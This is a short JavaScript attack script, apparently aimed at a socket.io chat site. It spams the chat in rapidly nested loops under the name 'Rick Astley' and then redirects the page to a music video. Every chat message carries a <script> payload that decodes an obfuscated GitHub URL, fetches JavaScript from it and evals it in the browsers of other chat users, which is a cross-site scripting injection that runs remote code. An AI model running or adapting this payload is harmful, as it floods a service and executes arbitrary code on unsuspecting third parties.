let coughtimer = 7777; setInterval(() => {
    const socketb = io("//");
    socketb.emit("client", "MAIN");
    socketb.emit("login", {
        name: "Rick Astley"
    });
    socketb.emit("command", {
        list: ["color"]
    });
    socketb.emit("command", {
        list: ["color"]
    });
    setInterval(() => {
    socketb.emit("talk", {
        text: "We're no strangers to love You know the rules and so do I A full commitment's what I'm thinking of You wouldn't get this from any other guy I just wanna tell you how I'm feeling Gotta make you understand Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'???'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
    });
    socket.emit("talk", {
        text: "We're no strangers to love You know the rules and so do I A full commitment's what I'm thinking of You wouldn't get this from any other guy I just wanna tell you how I'm feeling Gotta make you understand Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'???'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
            });
    });
    coughtimer = coughtimer - 125;
}, coughtimer);
setTimeout(() => {
    window.location.href = "https://ia801509.us.archive.org/10/items/Rick_Astley_Never_Gonna_Give_You_Up/Rick_Astley_Never_Gonna_Give_You_Up.mp4";
}, 27777)
